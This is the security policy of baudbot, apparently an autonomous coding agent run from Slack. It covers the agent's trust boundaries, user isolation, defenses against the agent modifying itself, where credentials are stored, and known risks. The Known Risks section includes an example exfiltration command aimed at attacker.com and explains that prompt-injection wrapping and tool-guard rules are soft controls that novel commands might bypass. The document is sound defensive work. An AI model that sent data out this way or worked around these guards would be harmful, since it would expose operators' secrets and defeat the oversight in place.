# Security

For product overview and team workflow context, start with [README.md](README.md). For architecture and operations docs, see [`docs/architecture.md`](docs/architecture.md) and [`docs/operations.md`](docs/operations.md).

## Architecture: Release / Runtime Separation

```text
root-managed releases
├── /opt/baudbot/releases/<sha>/       # immutable, git-free snapshots
├── /opt/baudbot/current -> <sha>
└── /opt/baudbot/previous -> <sha>

agent runtime (baudbot_agent)
├── ~/runtime/                         # launcher + bridge + runtime scripts
├── ~/.pi/agent/                       # deployed extensions/skills + memory + manifests
└── ~/workspace/                       # repos + task worktrees
```

Live execution runs from deployed/runtime copies.
`baudbot update` publishes a snapshot, deploys runtime files, validates health, then atomically flips `current`.

Live execution runs from release snapshots under `/opt/baudbot`.

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│                      UNTRUSTED                                   │
│   Slack messages, email body content, web-fetched content        │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│               BOUNDARY 1: Access Control                         │
│   Slack bridge: SLACK_ALLOWED_USERS allowlist                    │
│   Email: allowed senders + shared secret (BAUDBOT_SECRET)         │
│   Content wrapping: external messages get security boundaries    │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│               BOUNDARY 2: OS User Isolation                      │
│   baudbot_agent (uid 1001) — separate home, no sudo              │
│   In default hardened installs, admin home is not readable by agent (typically mode 700) │
│   Runtime executes from release snapshots under /opt/baudbot              │
│   Docker only via wrapper (blocks --privileged, host mounts)     │
└──────────────────────────────┬──────────────────────────────────┘
                               │
                               ▼
┌─────────────────────────────────────────────────────────────────┐
│               BOUNDARY 3: Network (if firewall applied)          │
│   Outbound: HTTP/HTTPS/SSH/DNS only                              │
│   No reverse shells, raw sockets, or non-standard ports          │
│   Localhost: bridge API, postgres, ollama                         │
└─────────────────────────────────────────────────────────────────┘
```

## Self-Modification Defense

| Layer | What | Bypassed by |
|-------|------|-------------|
| **Immutable releases** | Runtime deploys from git-free snapshots under `/opt/baudbot/releases/<sha>`, reducing direct source-tampering risk during live execution. | Root access |
| **File permissions** | Security-critical runtime files deployed `chmod a-w` by deploy.sh. Hard OS-level boundary — blocks `sed`, `python`, any write mechanism. | Root access or `chmod u+w` (which tool-guard blocks) |
| **Tool-guard rules** | Policy/guidance layer: blocks many high-risk Edit/Write/bash patterns and returns safety-interruption reasoning. Not a hard sandbox; novel command patterns may bypass it. | Novel bypass patterns; rely on OS file perms + runtime hardening for hard boundaries |
| **Integrity checks** | security-audit.sh compares runtime file hashes against deploy manifest | None (detection, not prevention) |
| **Pre-commit hook** | Blocks git commit of protected files in the repository | --no-verify (root-owned hook) |

Primary hard boundaries are runtime permissions, user isolation, and release-based deployment. If local source isolation is also enforced, admin can re-deploy from source to restore expected state.

## User Model

| User | Role | Sudo | Groups |
|------|------|------|--------|
| `<admin_user>` | Admin (human) | `(ALL) ALL`, `(baudbot_agent) NOPASSWD: ALL` | \<admin_user\>, wheel, docker, baudbot_agent |
| `baudbot_agent` | Agent (automated) | Only `/usr/local/bin/baudbot-docker` as root | baudbot_agent |

**Admin → baudbot_agent access**: The admin user is in the `baudbot_agent` group and has `NOPASSWD: ALL` as baudbot_agent via sudo. This is intentional for management. Run `bin/harden-permissions.sh` to ensure pi state files are owner-only (prevents passive group-level reads).

**baudbot_agent → admin access**: Expected to be none in default installs. This depends on host permissions (for example, admin home mode and group membership) remaining hardened.

## Data Flows

```text
Slack message (Socket Mode or broker pull mode)
  → bridge process (runs in baudbot_agent runtime)
    → content wrapping (security boundaries added)
      → control-agent (pi session)
        → creates todo + delegates to dev-agent in worktree
          → code/test/PR/CI loop
        → control-agent posts status via bridge local API (127.0.0.1:7890)
      → Slack thread reply
```

## Credential Inventory

| Secret | Location | Perms | Purpose |
|--------|----------|-------|---------|
| LLM API key(s) | `~/.config/.env` | `600` | LLM API access (one or more of: `ANTHROPIC_API_KEY`, `OPENAI_API_KEY`, `GEMINI_API_KEY`, `OPENCODE_ZEN_API_KEY`) |
| GitHub OAuth token | `~/.config/gh/hosts.yml` | `600` | `gh` CLI auth (via `gh auth login`) |
| `AGENTMAIL_API_KEY` | `~/.config/.env` | `600` | AgentMail inbox access |
| `KERNEL_API_KEY` | `~/.config/.env` | `600` | Kernel cloud browsers |
| `BAUDBOT_SECRET` | `~/.config/.env` | `600` | Email authentication shared secret |
| SSH key | `~/.ssh/id_ed25519` | `600` | Git push (agent GitHub account) |
| `SLACK_BOT_TOKEN` | `~/.config/.env` | `600` | Slack bot OAuth token |
| `SLACK_APP_TOKEN` | `~/.config/.env` | `600` | Slack Socket Mode token |
| `SLACK_BROKER_*` keys | `~/.config/.env` | `600` | Broker pull-mode encryption/signing + workspace linkage |

## Deploy Workflow

```bash
# Source-only changes from local checkout
sudo baudbot deploy

# Operational update from git (recommended for live bot)
sudo baudbot update

# Roll back if needed
sudo baudbot rollback previous
```

## Known Risks

### Agent has unrestricted shell
Within its own user permissions, `baudbot_agent` can run any command. Tool-guard and the safe-bash wrapper are defense-in-depth policy layers that block many known-dangerous patterns, but they are not a complete containment boundary and prompt injection could attempt novel commands.

### Agent can modify its own runtime files
The deployed copies of non-security files (bridge.mjs, skills, most extensions) are agent-writable by design. The agent could modify these. Security-critical files (tool-guard.ts, security.mjs) are write-protected at the filesystem level and monitored via integrity checks.

### Agent has internet access
Even with port-based firewall rules, the agent can reach any host over HTTPS. Data exfiltration via `curl https://attacker.com?data=...` is possible.

### Content wrapping is a soft defense
The `<<<EXTERNAL_UNTRUSTED_CONTENT>>>` boundaries and security notice ask the LLM to ignore injected instructions. This raises the bar but is not a hard security boundary.

### Session logs are sensitive transcripts
Pi session logs (`.jsonl` files) contain full conversation transcripts for retained sessions. Baudbot now prunes old logs on startup (14-day retention) and redacts common secret patterns, but retained logs are still sensitive data and should stay owner-only (see `bin/harden-permissions.sh`).

## Security Scripts

| Script | Purpose | Run as |
|--------|---------|--------|
| `bin/security-audit.sh` | Check current security posture + integrity checks | baudbot_agent or admin |
| `bin/deploy.sh` | Deploy from source to runtime with correct permissions | root or admin |
| `bin/harden-permissions.sh` | Lock down pi state file permissions | baudbot_agent |
| `bin/prune-session-logs.sh` | Delete old pi session transcripts (retention cleanup) | baudbot_agent |
| `bin/setup-firewall.sh` | Apply port-based network restrictions | root |

## Reporting Vulnerabilities

Do **not** open a public GitHub issue for security vulnerabilities.

Instead, use [GitHub Security Advisories](https://github.com/modem-dev/baudbot/security/advisories/new) to report privately. You can also email security@modem.dev.

We'll acknowledge reports within 48 hours and aim to release a fix within 7 days for critical issues.
